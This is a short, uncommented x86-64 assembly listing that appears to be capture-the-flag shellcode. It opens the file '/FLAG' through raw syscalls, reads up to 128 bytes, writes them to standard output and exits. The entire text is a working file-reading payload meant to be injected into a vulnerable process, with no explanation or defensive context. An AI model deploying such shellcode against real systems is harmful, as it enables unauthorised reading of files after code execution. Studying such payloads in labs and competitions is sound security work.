mov r11, 0x47414C462F
push r11
lea rdi, [rsp]
mov rsi, 0
mov rax, 0x2
syscall
pop r11
mov rdi, rax
lea rsi, [rsp - 0x80]
mov rdx, 0x80
mov rax, 0
syscall
mov rdi, 1
lea rsi, [rsp - 0x80]
mov rdx, rax
mov rax, 1
syscall
mov rdi, 0
mov rax, 0x3c
syscall
